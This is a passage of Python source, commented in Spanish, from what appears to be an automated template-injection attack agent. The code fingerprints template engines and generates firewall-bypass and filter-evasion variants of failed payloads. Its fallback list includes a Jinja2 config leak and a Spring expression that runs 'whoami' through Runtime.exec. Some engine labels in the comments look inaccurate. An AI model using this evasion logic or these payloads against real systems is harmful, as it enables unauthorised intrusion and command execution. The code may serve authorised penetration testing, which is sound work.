        if variant and variant != original and not feedback.was_variant_tried(variant):
            return {
                "payload": variant,
                "method": method,
                "engine_guess": engine
            }
        
        return None

    def _detect_engine_from_payload(self, payload: str) -> str:
        """Detecta el motor de plantillas basándose en la sintaxis."""
        if '{{' in payload and '}}' in payload:
            if '__class__' in payload or 'config' in payload:
                return 'jinja2'
            return 'twig'
        elif '${' in payload:
            return 'freemarker'
        elif '#set' in payload or '$!' in payload:
            return 'velocity'
        elif '{%' in payload:
            return 'jinja2'
        return 'unknown'

    def _try_alternative_engine(self, current_engine: str) -> str:
        """Devuelve un payload para un motor diferente."""
        payloads = {
            'jinja2': '{{7*7}}',
            'twig': '{{7*7}}',
            'freemarker': '${7*7}',
            'velocity': '#set($x=7*7)$x',
            'pebble': '{{7*7}}',
            'thymeleaf': '[[${7*7}]]'
        }
        
        # Elegir uno diferente al actual
        for engine, payload in payloads.items():
            if engine != current_engine:
                return payload
        
        return '{{7*7}}'

    def _encode_template_chars(self, payload: str, stripped: List[str]) -> str:
        """Codifica caracteres filtrados en sintaxis de plantilla."""
        result = payload
        
        # Si filtraron llaves, probar con otras sintaxis
        if '{' in stripped or '}' in stripped:
            # Cambiar de {{ a ${
            result = result.replace('{{', '${').replace('}}', '}')
        
        # URL encoding para otros caracteres
        for char in stripped:
            if char not in '{}':
                result = result.replace(char, f'%{ord(char):02X}')
        
        return result
    async def generate_bypass_variant(
        self,
        original_payload: str,
        failure_reason: str,
        waf_signature: Optional[str] = None,
        stripped_chars: Optional[str] = None,
        tried_variants: Optional[List[str]] = None
    ) -> Optional[str]:
        """
        Genera una variante de payload CSTI basada en feedback de fallo.
        
        Este método es llamado por el AgenticValidator cuando un payload falla,
        permitiendo al agente usar su lógica sofisticada de bypass para generar
        una variante que evite el problema detectado.
        
        Args:
            original_payload: El payload que falló
            failure_reason: Razón del fallo (waf_blocked, chars_filtered, etc.)
            waf_signature: Firma del WAF detectado (si aplica)
            stripped_chars: Caracteres que fueron filtrados
            tried_variants: Lista de variantes ya probadas
            
        Returns:
            String con el nuevo payload, o None si no se pudo generar
        """
        logger.info(f"[CSTIAgent] Generating bypass variant for failed payload: {original_payload[:50]}...")
        
        tried_variants = tried_variants or []
        
        # Detectar el motor del payload original
        current_engine = self._detect_engine_from_payload(original_payload)
        logger.info(f"[CSTIAgent] Detected engine from payload: {current_engine}")
        
        # Estrategia 1: Si hay WAF, usar encoding inteligente
        if waf_signature and waf_signature.lower() != "no identificado":
            logger.info(f"[CSTIAgent] WAF detected ({waf_signature}), using intelligent encoding...")
            
            encoded_variants = self._get_encoded_payloads([original_payload])
            for variant in encoded_variants:
                if variant not in tried_variants and variant != original_payload:
                    logger.info(f"[CSTIAgent] Generated WAF bypass variant: {variant[:80]}...")
                    return variant
        
        # Estrategia 2: Si hay caracteres filtrados, usar encoding de plantilla
        if stripped_chars:
            logger.info(f"[CSTIAgent] Characters filtered ({stripped_chars}), using template encoding...")
            
            encoded = self._encode_template_chars(original_payload, list(stripped_chars))
            if encoded not in tried_variants and encoded != original_payload:
                logger.info(f"[CSTIAgent] Generated encoded variant: {encoded[:80]}...")
                return encoded
        
        # Estrategia 3: Probar con motor alternativo
        alternative_payload = self._try_alternative_engine(current_engine)
        if alternative_payload and alternative_payload not in tried_variants:
            logger.info(f"[CSTIAgent] Generated alternative engine variant: {alternative_payload[:80]}...")
            return alternative_payload
        
        # Estrategia 4: Payloads universales avanzados
        universal_csti = [
            "{{7*7}}",  # Jinja2/Twig
            "${7*7}",   # Freemarker/Thymeleaf
            "#{7*7}",   # Ruby ERB
            "<%= 7*7 %>",  # ERB
            "{{= 7*7 }}",  # Pebble
            "${{7*7}}",    # Velocity
            "{{7*'7'}}",   # Alternative arithmetic
            "{{config}}",  # Jinja2 config leak
            "${T(java.lang.Runtime).getRuntime().exec('whoami')}",  # Spring SSTI
        ]
        
        for variant in universal_csti:
            if variant not in tried_variants:
                logger.info(f"[CSTIAgent] Generated universal variant: {variant[:80]}...")
                return variant
        
        logger.warning("[CSTIAgent] Could not generate new variant (all strategies exhausted)")
        return None
